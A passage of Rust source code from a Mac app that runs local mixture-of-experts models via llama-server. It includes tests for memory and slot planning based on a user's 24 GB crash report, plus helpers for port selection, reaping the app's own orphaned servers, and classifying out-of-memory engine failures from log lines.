        // 1.0 against 6.0 is under the 35 percent floor the install pipeline
        // already falls back on. Splitting there makes every record wait on
        // the slow side.
        let v = vec![vol("/", 200, Some(6.0)), vol("/Volumes/USB2", 200, Some(1.0))];
        assert_eq!(
            recommend_layout(&v, 60 * GB),
            PackLayout::Single { mount: "/".into() }
        );
    }

    #[test]
    fn an_unmeasured_volume_is_never_made_half_of_a_split() {
        // The split ratio is computed FROM the two bandwidths. Guessing one
        // writes a pack cut at the wrong place for the life of the install.
        let v = vec![vol("/", 200, Some(6.0)), vol("/Volumes/T7", 200, None)];
        assert_eq!(
            recommend_layout(&v, 60 * GB),
            PackLayout::Single { mount: "/".into() }
        );
    }

    #[test]
    fn a_pack_too_big_for_either_volume_alone_is_split_across_both() {
        // 300 GB of experts, two 200 GB volumes. Single is impossible and
        // dual is the only thing that installs at all.
        let v = vec![vol("/", 200, Some(6.0)), vol("/Volumes/T7", 200, Some(5.0))];
        assert_eq!(
            recommend_layout(&v, 300 * GB),
            PackLayout::Dual { internal: "/".into(), external: "/Volumes/T7".into() }
        );
    }

    #[test]
    fn the_faster_volume_takes_the_larger_share() {
        // Order matters: `internal` is the side pack_split_ratio gives r* to.
        let v = vec![vol("/Volumes/T7", 400, Some(3.0)), vol("/", 400, Some(6.0))];
        assert_eq!(
            recommend_layout(&v, 100 * GB),
            PackLayout::Dual { internal: "/".into(), external: "/Volumes/T7".into() }
        );
    }

    #[test]
    fn a_machine_with_nowhere_to_put_it_says_so_instead_of_choosing_a_volume() {
        let v = vec![vol("/", 20, Some(6.0)), vol("/Volumes/T7", 20, Some(5.0))];
        assert_eq!(recommend_layout(&v, 300 * GB), PackLayout::NoRoom);
        assert_eq!(recommend_layout(&[], 60 * GB), PackLayout::NoRoom);
    }

    #[test]
    fn the_reserve_is_kept_on_every_volume_a_share_lands_on() {
        // Exactly the pack and not a byte more is not enough: the 2 GiB
        // reserve is what keeps macOS able to work on the volume.
        let tight = vec![vol("/", 60, Some(6.0))];
        assert_eq!(recommend_layout(&tight, 60 * GB), PackLayout::NoRoom);
        let ok = vec![vol("/", 63, Some(6.0))];
        assert_eq!(recommend_layout(&ok, 60 * GB), PackLayout::Single { mount: "/".into() });
    }

    /// A model with three published quantizations. The ids are the shape the
    /// registry key would carry, not a real entry: no registry file is read.
    fn three_variants() -> Value {
        json!({
            "id": "variant-test-fixture",
            "variants": [
                { "id": "IQ2_XXS", "min_ram_gb": 16, "gguf_bytes": 23_000_000_000u64 },
                { "id": "Q4_K_M",  "min_ram_gb": 32, "gguf_bytes": 45_000_000_000u64 },
                { "id": "Q8_0",    "min_ram_gb": 64, "gguf_bytes": 79_000_000_000u64 }
            ]
        })
    }

    #[test]
    fn each_mac_is_offered_the_largest_quantization_it_can_hold() {
        assert_eq!(recommend_variant(&three_variants(), 128), Some("Q8_0".into()));
        assert_eq!(recommend_variant(&three_variants(), 64), Some("Q8_0".into()));
        assert_eq!(recommend_variant(&three_variants(), 48), Some("Q4_K_M".into()));
        assert_eq!(recommend_variant(&three_variants(), 24), Some("IQ2_XXS".into()));
    }

    #[test]
    fn a_mac_below_every_variant_is_offered_none_rather_than_the_smallest() {
        // 8 GB does not meet even IQ2_XXS. Handing it the smallest anyway is
        // how a user ends up downloading 23 GB for a model that cannot start.
        assert_eq!(recommend_variant(&three_variants(), 8), None);
    }

    #[test]
    fn an_entry_with_no_variants_key_keeps_todays_single_download() {
        // Every registry entry today. None means "use entry.download", which
        // is what the installer already does, so the key can be added one
        // model at a time.
        assert_eq!(recommend_variant(&json!({ "id": "x" }), 128), None);
        // A malformed variant with no floor is skipped, not guessed at.
        let broken = json!({ "variants": [{ "id": "Q4", "gguf_bytes": 1 }] });
        assert_eq!(recommend_variant(&broken, 128), None);
    }

    /// GLM-4.5-Air's shape: 7 GB of non-expert weights, 66 GB of experts.
    fn glm_air() -> Value {
        json!({
            "id": "recommendation-test-fixture",
            "min_ram_gb": 16,
            "non_expert_bytes": 7_000_000_000u64,
            "expert_bytes_total": 66_022_539_264u64,
            "layers_moe": 45,
            "experts": 128,
            "experts_used": 8,
            "record_bytes": 11_462_246u64,
            "measured": [
                { "cache_gb": 11.77, "gen_tps": 1.8 },
                { "cache_gb": 44.8, "gen_tps": 6.8 },
                { "cache_gb": 66.02, "gen_tps": 15.4 }
            ],
        })
    }

    #[test]
    fn a_mac_with_room_gets_the_second_conversation() {
        // 128 GB, idle. Balanced reaches full residency and a second KV cache
        // is 0.8 GB out of tens of gigabytes of headroom.
        let m = MachineLimits::mac(128, Some(100 * GB));
        assert_eq!(recommended_slots(&glm_air(), m, "balanced", false), 2);
    }

    /// A model sized so the SECOND slot is what tips the mode over, on a
    /// machine that can otherwise afford balanced. 3 GB of non-expert weights
    /// and 40 GB of experts across 32 layers of 64.
    ///
    /// The shape matters: with GLM-4.5-Air on a 24 GB Mac the planner refuses
    /// at every slot count, so a test written on it passes whether or not the
    /// mode is checked at all. This fixture is the case the rule exists for,
    /// where two slots start and start WORSE.
    fn slot_sensitive() -> Value {
        json!({
            "id": "slot-policy-test-fixture",
            "min_ram_gb": 16,
            "non_expert_bytes": 3_000_000_000u64,
            "expert_bytes_total": 40_000_000_000u64,
            "layers_moe": 32,
            "experts": 64,
            "experts_used": 8,
            "record_bytes": 19_531_250u64,
            "measured": [
                { "cache_gb": 7.0, "gen_tps": 3.0 },
                { "cache_gb": 10.0, "gen_tps": 9.0 },
                { "cache_gb": 40.0, "gen_tps": 10.0 }
            ],
        })
    }

    #[test]
    fn a_mac_that_would_pay_for_the_second_conversation_with_its_mode_does_not_get_it() {
        // 32 GB Mac with 21.3 GB free, so the engine may hold 17.04 GB.
        // Balanced at one slot is 16.85 GB and fits. Balanced at two slots is
        // 17.65 GB and does not, and the flat default of two would have taken
        // the user from Balanced to Eco to buy a second conversation nobody
        // had opened yet.
        let m = MachineLimits::mac(32, Some(21_300_000_000));
        assert_eq!(recommended_slots(&slot_sensitive(), m, "balanced", false), 1);
        // And the step-down is real, not the planner refusing outright: two
        // slots DO start, in a worse mode. Without this the test above would
        // pass on a machine where nothing starts at all, which is how the
        // first version of it passed while checking nothing.
        let two = plan_cache(&slot_sensitive(), m, None, "balanced", false, 2).unwrap();
        assert_eq!(two.decision.mode, "eco");
        assert_eq!(two.decision.requested, "balanced");
        let one = plan_cache(&slot_sensitive(), m, None, "balanced", false, 1).unwrap();
        assert_eq!(one.decision.mode, "balanced");
    }

    #[test]
    fn a_mac_that_cannot_start_the_model_at_all_is_not_told_it_has_two_conversations() {
        // The colleague's 24 GB Mac with GLM-4.5-Air: the planner refuses at
        // every slot count, and the answer has to be a number llama-server can
        // be started with so the refusal comes from the planner, with its
        // sentence about memory, rather than from here.
        let m = MachineLimits::mac(24, Some(14 * GB));
        assert_eq!(recommended_slots(&glm_air(), m, "balanced", false), 1);
        assert!(plan_cache(&glm_air(), m, None, "balanced", false, 1).is_err());
    }

    #[test]
    fn a_model_that_cannot_start_at_all_still_answers_one_rather_than_zero() {
        // plan_cache refuses at every slot count. Zero slots is not a thing
        // llama-server can be started with, so the refusal has to come from
        // the planner with its sentence about memory, not from here.
        let m = MachineLimits::mac(24, Some(GB));
        assert_eq!(recommended_slots(&glm_air(), m, "balanced", false), 1);
    }
}

#[cfg(test)]
mod plan_cache_tests {
    use super::{plan_cache, MachineLimits};
    use serde_json::json;

    const GB: u64 = 1_000_000_000;

    /// A MoE model shaped like GLM-4.5-Air: 3 GB of non-expert weights, 40 GB
    /// of routed experts. The id is deliberately not a real one, so
    /// measured_geometry cannot find a profile.json and reads these fields.
    fn entry(measured: serde_json::Value) -> serde_json::Value {
        json!({
            "id": "plan-cache-test-fixture",
            "min_ram_gb": 16,
            "non_expert_bytes": 3_000_000_000u64,
            "expert_bytes_total": 40_000_000_000u64,
            "layers_moe": 46,
            "experts": 128,
            "experts_used": 8,
            "record_bytes": 4_000_000u64,
            "measured": measured,
        })
    }

    /// The three terms the engine pays before a single expert byte is cached:
    /// weights, then the affine runtime-overhead fit plan_cache uses.
    const FIXED: u64 = 3_000_000_000 + (2_500_000_000 + 3_000_000_000 * 45 / 100);

    #[test]
    fn the_seventy_percent_cap_bounds_the_whole_footprint_not_just_the_arena() {
        // DEFECT 1, pinned. The cap used to bound the ARENA and the weights and
        // the runtime overhead were added on top, so on this 24 GB Mac the
        // planner handed the engine a 15.1 GB arena and 22.0 GB resident: 92
        // percent of the machine, under a bound that reads "70 percent".
        //
        // Against that old shape this assertion is 15_150_000_000 and goes red.
        let plan = plan_cache(&entry(json!([])), MachineLimits::mac(24, None), None, "perf", false, 1).unwrap();
        assert_eq!(plan.cache_bytes, 24 * GB * 7 / 10 - FIXED);
        assert_eq!(
            plan.cache_bytes + FIXED,
            16_800_000_000,
            "everything the engine holds must fit under 70 percent of 24 GB"
        );
        assert_eq!(plan.decision.mode, "perf");
    }

    /// A measured curve, so the three modes are three different sizes.
    fn curve() -> serde_json::Value {
        json!([
            {"cache_gb": 4.0, "gen_tps": 20.0},
            {"cache_gb": 8.0, "gen_tps": 30.0},
            {"cache_gb": 10.0, "gen_tps": 31.0},
        ])
    }

    #[test]
    fn an_idle_mac_still_gets_the_mode_it_asked_for() {
        // No reading available: the planner falls back to installed RAM, which
        // is exactly the behaviour that existed before, so a broken vm_stat
        // cannot make the app refuse to work.
        let plan = plan_cache(&entry(curve()), MachineLimits::mac(24, None), None, "perf", false, 1).unwrap();
        assert_eq!(plan.decision.mode, "perf");
        assert_eq!(plan.decision.requested, "perf");
    }

    #[test]
    fn a_mac_with_a_browser_open_starts_in_eco_instead_of_dying_mid_graph() {
        // DEFECT 2, pinned. 24 GB installed, 16 GB actually free, so 12.8 GB to
        // spare. perf wants 16.8 and balanced 14.85; eco needs 10.85 and fits.
        // This is the case that reached the user as "Compute error.".
        let plan = plan_cache(&entry(curve()), MachineLimits::mac(24, Some(16 * GB)), None, "perf", false, 1).unwrap();
        assert_eq!(plan.decision.mode, "eco");
        assert_eq!(plan.decision.requested, "perf");
        assert_eq!(plan.cache_bytes, 4 * GB);
        assert!(plan.decision.resident_bytes <= plan.decision.budget_bytes);
    }

    #[test]
    fn the_step_down_stops_at_the_first_mode_that_fits() {
        // 19 GB free of 24, so 15.2 GB to spare: perf does not fit, balanced
        // does. Falling straight to eco here would cost the user a working
        // mode for nothing.
        let plan = plan_cache(&entry(curve()), MachineLimits::mac(24, Some(19 * GB)), None, "perf", false, 1).unwrap();
        assert_eq!(plan.decision.mode, "balanced");
        assert_eq!(plan.cache_bytes, 8 * GB);
    }

    #[test]
    fn a_machine_with_nothing_to_spare_is_told_so_before_anything_is_spawned() {
        let err = plan_cache(&entry(curve()), MachineLimits::mac(24, Some(2 * GB)), None, "balanced", false, 1)
            .expect_err("2 GB free cannot hold a 3 GB model plus its arena");
        assert!(err.contains("memory"), "the refusal must name memory: {err}");
        assert!(err.contains("eco"), "and name the footprint it tried: {err}");
        assert!(err.contains("short by"), "and the figure that is missing: {err}");
    }

    #[test]
    fn every_decode_slot_past_the_first_is_paid_for_out_of_the_arena() {
        // Third instance of the same class of defect. The overhead fit was
        // measured at ctx 8192, which is ONE slot, while the engine is started
        // with --parallel 2 by default: 0.8 GB of KV cache the ceiling never
        // budgeted. Nothing about the resident total changes here, because in
        // perf the total IS the budget; what changes is that the arena stops
        // being handed memory the KV cache has already taken.
        let one = plan_cache(&entry(json!([])), MachineLimits::mac(24, None), None, "perf", false, 1).unwrap();
        let two = plan_cache(&entry(json!([])), MachineLimits::mac(24, None), None, "perf", false, 2).unwrap();
        let four = plan_cache(&entry(json!([])), MachineLimits::mac(24, None), None, "perf", false, 4).unwrap();
        assert_eq!(one.cache_bytes - two.cache_bytes, 800_000_000);
        assert_eq!(one.cache_bytes - four.cache_bytes, 2_400_000_000);
    }

    #[test]
    fn an_explicit_cache_size_still_overrules_the_policy() {
        // The override is the escape hatch for someone who knows their machine.
        // It must not be silently replaced by a step-down decision.
        let plan = plan_cache(&entry(curve()), MachineLimits::mac(24, Some(19 * GB)), Some(6), "perf", false, 1).unwrap();
        assert_eq!(plan.cache_bytes, 6 * GB);
    }
}

/// A user's report, turned into arithmetic.
///
/// A colleague on an M5 Mac with 24 GB started a chat in BALANCED, the default,
/// and got `Compute error.` He reproduced it with phi35-moe and with
/// gpt-oss-120b, and both times eco got him out, which he found by trying.
///
/// These are those two machines, those two models, that mode. They are written
/// as fixtures rather than read from the registry on purpose: the registry is
/// edited, and the point of these cases is that somebody breaking the fix in
/// six months sees THIS USER's case go red, not a number that drifted.
#[cfg(test)]
mod user_report_24gb_tests {
    use super::{plan_cache, MachineLimits};
    use serde_json::json;

    const GB: u64 = 1_000_000_000;

    /// phi35-moe, from scripts/models-registry.json. `record_bytes` is absent
    /// from the registry entry (it comes from the install profile), so it is
    /// derived here the way the pack writer does: routed bytes over layers
    /// times experts, 24.38 GB / (32 * 16).
    fn phi35_moe() -> serde_json::Value {
        json!({
            "id": "user-report-phi35-moe",
            "min_ram_gb": 16,
            "non_expert_bytes": 900_000_000u64,
            "expert_bytes_total": 24_381_489_152u64,
            "layers_moe": 32,
            "experts": 16,
            "experts_used": 2,
            "record_bytes": 47_620_096u64,
            "measured": [
                {"cache_gb": 10.1,  "gen_tps": 13.2},
                {"cache_gb": 16.8,  "gen_tps": 20.4},
                {"cache_gb": 22.4,  "gen_tps": 22.7},
                {"cache_gb": 24.38, "gen_tps": 23.8},
            ],
        })
    }

    /// gpt-oss-120b, from scripts/models-registry.json, geometry unmodified.
    fn gpt_oss_120b() -> serde_json::Value {
        json!({
            "id": "user-report-gpt-oss-120b",
            "min_ram_gb": 16,
            "non_expert_bytes": 4_500_000_000u64,
            "expert_bytes_total": 60_926_459_904u64,
            "layers_moe": 36,
            "experts": 128,
            "experts_used": 4,
            "record_bytes": 13_221_888u64,
            "min_cache_bytes": 7_616_207_616u64,
            "measured": [
                {"cache_gb": 5.06,  "gen_tps": 2.1},
                {"cache_gb": 13.06, "gen_tps": 4.3},
                {"cache_gb": 21.06, "gen_tps": 6.9},
                {"cache_gb": 24.81, "gen_tps": 7.7},
                {"cache_gb": 33.6,  "gen_tps": 13.1},
                {"cache_gb": 44.8,  "gen_tps": 19.2},
                {"cache_gb": 60.93, "gen_tps": 21.8},
            ],
        })
    }

    // What the OLD planner handed the engine on this 24 GB Mac, in balanced,
    // recomputed from the shape it had:
    //
    //   fixed     = non_expert + 2.5 GB + non_expert * 0.45   (slots ignored)
    //   max_cache = min(ram - fixed - reserve, ram * 7/10, expert_total)
    //   resident  = fixed + cache chosen on that ceiling
    //
    // phi35-moe:     fixed 3.805, ceiling 16.80, knee 16.80 -> 20.61 GB resident
    // gpt-oss-120b:  fixed 9.025, ceiling 12.98, knee  5.06 -> 14.09 GB resident
    //
    // On a 24 GB Mac running macOS, this app, its webview and a browser, the
    // first is 86 percent of the machine and the second 59, and NEITHER was
    // ever compared against what the machine actually had free.
    const OLD_PHI35_BALANCED_RESIDENT: u64 = 20_605_000_000;
    const OLD_GPT_OSS_BALANCED_RESIDENT: u64 = 14_085_000_000;

    #[test]
    fn phi35_moe_on_a_24gb_mac_in_balanced_no_longer_plans_twenty_gigabytes() {
        // The ceiling fix alone, with no reading of free memory: balanced falls
        // from 20.6 GB resident to 13.9, because the 70 percent cap now bounds
        // the whole footprint and the knee is recomputed under it.
        let plan = plan_cache(&phi35_moe(), MachineLimits::mac(24, None), None, "balanced", false, 1).unwrap();
        assert_eq!(plan.cache_bytes, 10_100_000_000);
        assert_eq!(plan.decision.resident_bytes, 13_905_000_000);
        // And it gets there WITHOUT stepping down: on an idle 24 GB Mac
        // balanced is affordable, so the ladder must not be doing this work.
        // A ceiling that still overcommits would show up here as a step-down.
        assert_eq!(plan.decision.mode, "balanced");
        assert!(
            plan.decision.resident_bytes < OLD_PHI35_BALANCED_RESIDENT,
            "the ceiling fix must strictly improve this user's case"
        );
    }

    #[test]
    fn phi35_moe_balanced_now_holds_what_the_user_had_to_find_by_trying_eco() {
        // The user's machine as he described it: 24 GB, a working session open,
        // 18 GB actually free, so 14.4 claimable.
        //
        // Balanced held 20.6 GB before, which is 6.2 GB more than this machine
        // had to give: that gap IS the "Compute error." he read. It now holds
        // 13.9, the same footprint he reached by switching to eco himself, and
        // the request never has to change mode to get there.
        let plan = plan_cache(&phi35_moe(), MachineLimits::mac(24, Some(18 * GB)), None, "balanced", false, 1).unwrap();
        assert_eq!(plan.decision.requested, "balanced");
        assert_eq!(plan.decision.mode, "balanced");
        assert_eq!(plan.decision.budget_bytes, 14_400_000_000);
        assert_eq!(plan.decision.resident_bytes, 13_905_000_000);
        assert!(
            OLD_PHI35_BALANCED_RESIDENT > plan.decision.budget_bytes,
            "and this is why he met Compute error.: the old plan did not fit, by {} bytes",
            OLD_PHI35_BALANCED_RESIDENT - plan.decision.budget_bytes
        );
    }

    #[test]
    fn phi35_moe_in_performance_steps_down_on_that_same_machine() {
        // Same Mac, same 18 GB free. Performance would hold the full 16.8 GB
        // ceiling, which does not fit in 14.4, so the ladder takes one rung and
        // says which. The user is told; nothing is decided behind his back.
        let plan = plan_cache(&phi35_moe(), MachineLimits::mac(24, Some(18 * GB)), None, "perf", false, 1).unwrap();
        assert_eq!(plan.decision.requested, "perf");
        assert_eq!(plan.decision.mode, "balanced");
        assert!(plan.decision.resident_bytes <= plan.decision.budget_bytes);
    }

    #[test]
    fn gpt_oss_120b_shows_the_ceiling_fix_alone_would_not_have_saved_him() {
        // THE POINT WORTH KEEPING. For this model the 70 percent cap was never
        // the binding constraint: `ram - fixed - reserve` was, at 12.98 GB. So
        // the ceiling fix changes NOTHING here, and a report that stopped at
        // "the cap is fixed" would have declared the user's bug closed while
        // one of his two models still planned 14.1 GB resident with nobody
        // asking whether the machine had 14.1 GB to give.
        let plan = plan_cache(&gpt_oss_120b(), MachineLimits::mac(24, None), None, "balanced", false, 1).unwrap();
        assert_eq!(plan.decision.resident_bytes, OLD_GPT_OSS_BALANCED_RESIDENT);
    }

    #[test]
    fn gpt_oss_120b_is_refused_with_the_missing_figure_instead_of_crashing() {
        // Same 24 GB Mac with a browser open: 12 GB free, so 9.6 GB claimable.
        // Even eco needs 14.1. There is no mode that fits, and the honest
        // answer is a number and a refusal, not an engine that dies mid-graph.
        let err = plan_cache(&gpt_oss_120b(), MachineLimits::mac(24, Some(12 * GB)), None, "balanced", false, 1)
            .expect_err("14.1 GB cannot come out of 9.6");
        assert!(err.contains("9.6 GB"), "name what the machine can give: {err}");
        assert!(err.contains("short by 4.5 GB"), "and what is missing: {err}");
    }

    #[test]
    fn gpt_oss_120b_runs_again_once_the_machine_has_room() {
        // The same Mac after the user quits a few things: 18 GB free, 14.4
        // claimable, and eco's 14.085 fits. Nothing here refuses out of
        // caution; the gate is arithmetic, and it opens when the memory is
        // really there.
        let plan = plan_cache(&gpt_oss_120b(), MachineLimits::mac(24, Some(18 * GB)), None, "balanced", false, 1)
            .expect("14.085 GB fits in 14.4");
        assert!(plan.decision.resident_bytes <= plan.decision.budget_bytes);
    }

    #[test]
    fn the_ladder_always_lands_on_a_mode_that_fits_or_refuses_outright() {
        // The step-down cannot loop: it walks a three-element array once. What
        // is worth proving is the other half, that it never hands back a mode
        // that does not fit either, which is the failure mode a retry loop
        // would have had. Swept across every budget from nothing to 32 GB, on
        // both of this user's models, in all three modes.
        for entry in [phi35_moe(), gpt_oss_120b()] {
            for mode in ["eco", "balanced", "perf"] {
                for step in 0..=64u64 {
                    let available = step * 500_000_000;
                    match plan_cache(&entry, MachineLimits::mac(24, Some(available)), None, mode, false, 2) {
                        Ok(plan) => assert!(
                            plan.decision.resident_bytes <= plan.decision.budget_bytes,
                            "{mode} at {available} bytes free planned {} over a budget of {}",
                            plan.decision.resident_bytes,
                            plan.decision.budget_bytes
                        ),
                        // A refusal is a legitimate answer, and the only other
                        // one. It must always carry the figure that is missing.
                        Err(e) => assert!(
                            e.contains("memory"),
                            "a refusal must explain itself: {e}"
                        ),
                    }
                }
            }
        }
    }
}

/// Pick a port we can actually bind. A crashed run can leave an orphan holding
/// the previous one, and other software may squat it too, so instead of
/// fighting for a fixed port we scan a small range and take the first free
/// slot. Orphaned llama-servers of ours are reaped along the way.
/// Reap only servers WE left behind: a llama-server whose command line points
/// at the configured Galactus folder. A llama-server the user started by hand
/// elsewhere is never touched. Purely a memory courtesy, the dynamic port
/// already removes any bind conflict.
fn reap_orphan_servers(root: &Path) {
    let root_str = root.to_string_lossy().into_owned();
    let out = Command::new("pgrep").args(["-f", "llama-server"]).output();
    let pids: Vec<i32> = out
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .filter_map(|l| l.trim().parse().ok())
                .collect()
        })
        .unwrap_or_default();
    let me = std::process::id() as i32;
    for pid in pids {
        if pid == me {
            continue;
        }
        let args = run_capture("ps", &["-p", &pid.to_string(), "-o", "command="]);
        if args.contains("llama-server") && args.contains(&root_str) {
            let _ = Command::new("kill").arg("-9").arg(pid.to_string()).status();
        }
    }
}

fn pick_free_port() -> Result<u16, String> {
    use std::net::TcpListener;
    for offset in 0..SERVER_PORT_SPAN {
        let port = SERVER_PORT_BASE + offset;
        match TcpListener::bind(("127.0.0.1", port)) {
            Ok(l) => {
                drop(l); // released immediately; llama-server takes it next
                return Ok(port);
            }
            Err(_) => continue,
        }
    }
    Err(format!(
        "no free port in {}..{}",
        SERVER_PORT_BASE,
        SERVER_PORT_BASE + SERVER_PORT_SPAN
    ))
}

/// Last lines of llama-server.log, attached to failure events so the UI can
/// show why the engine died.
fn server_log_tail(lines: usize) -> String {
    std::fs::read_to_string(app_support().join("llama-server.log"))
        .map(|t| {
            t.lines()
                .rev()
                .take(lines)
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect::<Vec<_>>()
                .join("\n")
        })
        .unwrap_or_default()
}

// ------------------------------------------- reading the engine's own words
//
// "Compute error." is what llama-server says when llama_decode returns below
// -1: the graph did not run. The message names no cause, and memory is only
// one of the things that can produce it, so the string alone cannot be turned
// into advice without guessing.
//
// The engine does say more, one line earlier, in its own log. That is what is
// read here instead.

/// Substrings that mean an allocator refused. Matched lowercase, against the
/// log, never against the API message.
///
/// Where each one comes from, so a llama.cpp bump can be checked against this
/// list rather than trusted:
///   ggml-alloc.c        "not enough space in the buffer to allocate ..."
///   ggml-backend.cpp    "failed to allocate buffer, size = ..."
///   ggml-metal-device.m "failed to allocate context", "greater than the
///                        recommended max working set size"
///   Metal itself        the command buffer's localizedDescription, which for
///                        a GPU allocation failure reads "Insufficient Memory
///                        (00000008:kIOGPUCommandBufferCallbackErrorOutOfMemory)"
///   libc                strerror(ENOMEM), "Cannot allocate memory"
const OOM_MARKERS: [&str; 8] = [
    "failed to allocate",
    "unable to allocate",
    "cannot allocate memory",
    "not enough space in the buffer",
    "out of memory",
    "outofmemory",
    "insufficient memory",
    "greater than the recommended max working set size",
];

/// Substrings that prove the log line came from a decode that gave up, so the
/// current log can be told apart from one that simply has nothing to say.
const DECODE_FAILURE_MARKERS: [&str; 4] = [
    "compute error",
    "invalid input batch",
    "command buffer",
    "context size has been exceeded",
];

/// What the engine's words say about a failure the user just met.
///
/// `memory`  the allocator refused, and the one action that works is to give
///           the engine less to hold.
/// `context` the conversation outgrew the window. Not a memory problem, and
///           telling the user to switch to Eco would send them the wrong way.
/// `unknown` the log names neither. Say so rather than invent a cause.
fn classify_engine_failure(api_message: &str, log: &str) -> &'static str {
    let msg = api_message.to_lowercase();
    // Checked FIRST: an exceeded context can happen on a machine with memory
    // to spare, and the two remedies point in opposite directions.
    if msg.contains("context size has been exceeded")
        || msg.contains("exceed the available context")
        || msg.contains("context shift")
    {
        return "context";
    }
    let low = log.to_lowercase();
    if OOM_MARKERS.iter().any(|m| low.contains(m)) {
        return "memory";
    }
    "unknown"
}

/// The engine log worth classifying.
///
/// llama-server.log is the running engine; the `.1` beside it is the previous
/// run, kept because a failed start is usually reported after the user has
/// already retried. When the current log holds no trace of a decode giving up,
/// the evidence is in the older one, and reading only the current file would
/// report "unknown" on the exact case this exists for.
fn engine_log_evidence() -> String {
    let current = read_log_tail("llama-server.log");
    let low = current.to_lowercase();
    let speaks = DECODE_FAILURE_MARKERS.iter().any(|m| low.contains(m))
        || OOM_MARKERS.iter().any(|m| low.contains(m));
    if speaks {
        return current;
    }
    let previous = read_log_tail("llama-server.log.1");
    if previous.is_empty() { current } else { previous }
}

/// Last quarter of a megabyte of an engine log.
///
/// A long session writes a log measured in tens of megabytes, and the verdict
/// is always in its last handful of lines. Reading the whole file to look at
/// its tail would make diagnosing a failure cost more than the failure.
fn read_log_tail(name: &str) -> String {
    use std::io::{Read, Seek, SeekFrom};
    const WINDOW: u64 = 256 * 1024;
    let Ok(mut f) = std::fs::File::open(app_support().join(name)) else {
        return String::new();
    };
    let len = f.metadata().map(|m| m.len()).unwrap_or(0);
    if len > WINDOW && f.seek(SeekFrom::Start(len - WINDOW)).is_err() {
        return String::new();
    }
    let mut buf = Vec::new();
    if f.read_to_end(&mut buf).is_err() {
        return String::new();
    }
    String::from_utf8_lossy(&buf).into_owned()
}

/// The engine's own line that carries the verdict, so what the UI shows is
/// evidence rather than a claim. Empty when the log names nothing.
fn engine_failure_evidence(log: &str) -> String {
    log.lines()
        .rev()
        .find(|l| {
            let low = l.to_lowercase();
            OOM_MARKERS.iter().any(|m| low.contains(m))
        })
        .map(|l| l.trim().chars().take(240).collect())
        .unwrap_or_default()
}

/// What the UI needs to replace "Compute error." with a sentence.
#[derive(Serialize, Clone, Debug)]
struct EngineDiagnosis {
    /// memory | context | unknown
    kind: String,
    /// The footprint mode the running engine was started in ("" when stopped).
    mode: String,
    /// Whether there is a leaner mode left to fall back to. False in eco,
    /// where the honest advice is to free memory instead.
    can_step_down: bool,
    /// The engine's own line, shown so the diagnosis can be checked.
    evidence: String,
    /// The raw engine message, passed through for the unknown case.
    message: String,
}

/// Diagnose a failure the user just met in a conversation.
///
/// Called from the chat error path with the message llama-server sent. The
/// classification reads the engine log rather than pattern-matching the
/// message, because the message is the same three words whatever happened.
///
/// Async so the log read never runs on the main thread: this is called at the
/// exact moment the machine is short of memory and the UI must stay alive.
#[tauri::command]
async fn engine_diagnose(message: String) -> EngineDiagnosis {
    let log = engine_log_evidence();
    let kind = classify_engine_failure(&message, &log);
    let mode = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        s.footprint.as_ref().map(|f| f.mode.clone()).unwrap_or_default()
    };
    EngineDiagnosis {
        can_step_down: !mode.is_empty() && mode != "eco",
        kind: kind.to_string(),
        mode,
        evidence: if kind == "memory" { engine_failure_evidence(&log) } else { String::new() },
        message,
    }
}

#[cfg(test)]
mod chat_parsing_tests {
    use super::chat_parsing_args;

    #[test]
    fn the_engine_is_told_to_separate_thinking_from_the_answer() {
        // Without this pair the thoughts either never leave `content` or are
        // re-inlined into it, and the app is back to showing nothing while a
        // model reasons for half a minute.
        let args = chat_parsing_args();
        let at = args
            .iter()
            .position(|a| *a == "--reasoning-format")
            .expect("the engine must be told which reasoning format to use");
        assert_eq!(
            args.get(at + 1),
            Some(&"deepseek"),
            "the value has to follow the flag, or llama-server reads the next flag as it"
        );
    }

    #[test]
    fn the_legacy_format_is_never_the_one_asked_for() {
        // deepseek-legacy extracts the thoughts AND re-inlines them into the
        // content while streaming, which puts raw <think> tags back on screen.
        // It reads like a harmless synonym and is the one wrong answer here.
        assert!(
            !chat_parsing_args().contains(&"deepseek-legacy"),
            "deepseek-legacy re-inlines thinking into the streamed content"
        );
    }

    #[test]
    fn the_template_engine_stays_on() {
        // The reasoning format is only consulted on the jinja path: without
        // --jinja the server never runs the parser that fills reasoning_content.
        assert!(chat_parsing_args().contains(&"--jinja"));
    }
}

#[cfg(test)]
mod engine_failure_tests {
    use super::classify_engine_failure;

    /// What a real Metal allocation failure leaves behind, trimmed.
    const METAL_OOM: &str = "\
ggml_metal_synchronize: error: command buffer 0 failed with status 5
error: Insufficient Memory (00000008:kIOGPUCommandBufferCallbackErrorOutOfMemory)
srv  update_slots: Compute error. off = 0, n_batch = 512, ret = -3";

    #[test]
    fn the_allocator_refusing_is_named_memory() {
        assert_eq!(classify_engine_failure("Compute error.", METAL_OOM), "memory");
    }

    #[test]
    fn the_ggml_allocator_message_counts_too() {
        let log = "ggml_gallocr_reserve_n: not enough space in the buffer to allocate 1073741824 bytes";
        assert_eq!(classify_engine_failure("Compute error.", log), "memory");
    }

    #[test]
    fn an_exceeded_context_is_never_reported_as_memory() {
        // The remedies point opposite ways: this one is answered by a shorter
        // conversation, not by a smaller footprint. Even with an old memory
        // line still sitting in the log, the message decides.
        assert_eq!(
            classify_engine_failure("Context size has been exceeded.", METAL_OOM),
            "context"
        );
    }

    #[test]
    fn a_failure_the_log_does_not_explain_stays_unknown() {
        // Inventing a memory story here would send the user to Settings for
        // nothing, and would hide the real fault.
        let log = "srv  update_slots: Compute error. off = 0, n_batch = 512, ret = -3";
        assert_eq!(classify_engine_failure("Compute error.", log), "unknown");
        assert_eq!(classify_engine_failure("Compute error.", ""), "unknown");
    }
}

// Async: pack resolution and the port scan touch disks and sockets, which
/// Proof that a llama-server carries the Galactus engine, not just its flags.
///
/// The engine code is linked into the llama library, so the marker is looked up
/// in the binary AND in the llama/ggml dylibs beside it. A stock upstream build
/// silently ignores every GALACTUS_H4_* variable and would serve the model
/// natively, which is exactly what the product forbids: fail closed instead.
fn engine_is_wired(bin: &Path) -> Result<(), String> {
    const MARKER: &[u8] = b"galactus_h4:";
    let mut candidates: Vec<PathBuf> = vec![bin.to_path_buf()];
    if let Some(dir) = bin.parent() {
        for probe in [dir.to_path_buf(), dir.join("../lib")] {
            if let Ok(entries) = std::fs::read_dir(&probe) {
                for e in entries.flatten() {
                    let p = e.path();
